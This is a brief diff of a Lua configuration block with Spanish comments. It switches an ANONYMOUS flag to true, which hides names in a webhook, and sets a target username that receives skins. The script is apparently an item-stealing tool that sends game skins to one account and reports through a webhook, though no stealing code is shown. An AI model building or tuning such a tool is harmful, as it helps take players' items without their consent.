@@ -1,5 +1,5 @@
 local CONFIG = {
-    ANONYMOUS     = false, -- oculta los nombres en el webhook
+    ANONYMOUS     = true, -- oculta los nombres en el webhook
 
     TARGET_NAME   = "yamxsb", -- username de la cuenta que recibe las skins
    
